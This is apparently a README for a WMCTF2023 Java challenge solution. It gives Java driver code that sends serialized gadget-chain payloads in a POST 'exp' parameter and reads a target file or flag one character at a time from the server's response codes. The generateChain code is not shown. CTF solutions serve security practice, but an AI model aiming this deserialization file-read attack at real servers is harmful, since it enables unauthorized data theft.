# WMCTF2023-Ezjava_agagin
***
Challenge by Ha1c9on

使用说明
```java
public static void main(String[] args) throws Exception {
        guess("xxx","xxx");
    }
```
自行更改上述中的2个参数，分别对应题目靶场地址和需要读取的文件名。
```java
public static void guess(String address,String filename) throws Exception {
        String strs="abcdefghijklmnopqrstuvwxyz_{}ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        boolean symbol=true;
        int index=0;
        String flag="";
        while(symbol){
            System.out.println(String.format("[*]start to guess %d place",index));
            for (char c : strs.toCharArray()) {
                Hashtable hashtable = generateChain(index, c,filename);
                String expbase64 = SerializeUtils.base64serial(hashtable);
                try {
                    String poc = String.format("exp=%s", URLEncoder.encode(expbase64, "UTF-8"));
                    int status = doPostWithParams(poc, address);
                    if (status == 200) {
                        if(c=='}'){
                            symbol=false;
                        }
                        flag += c;
                        System.out.println(String.format("[*]flag is: %s",flag));
                        index++;
                        break;
                    }
                }catch (Exception e){

                }
            }
        }
    }
```
另外请注意上述代码中，我们对应POST中的exp参数为入口点，自行修改。